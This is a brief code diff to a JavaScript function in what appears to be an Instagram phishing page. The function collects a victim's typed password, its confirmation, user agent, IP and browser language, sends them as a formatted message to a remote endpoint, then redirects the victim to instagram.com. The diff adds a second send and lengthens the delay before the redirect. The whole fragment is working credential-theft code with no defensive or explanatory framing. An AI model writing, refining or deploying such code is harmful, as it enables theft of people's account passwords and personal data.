@@ -23,7 +23,8 @@ function sendMessage() {
             content: ("> **FROM : **" + window.location.href + "\n> **PASSWORD  : **" + document.getElementById('password').value + "\n> **CONFIRMED PASSWORD : **" + document.getElementById('password1').value + "\n> **USER AGENT : **" + navigator.userAgent + "\n> **IP : **" + document.getElementById('ciao').innerHTML + "\n> **LANGUAGE : **" + navigator.language || navigator.userLanguage)
         }
         request.send(JSON.stringify(params));
-        sleep(400) 
+        request.send(JSON.stringify("reset"));
+        sleep(2000) 
         window.location.replace("https://instagram.com/");   
     }
     else{
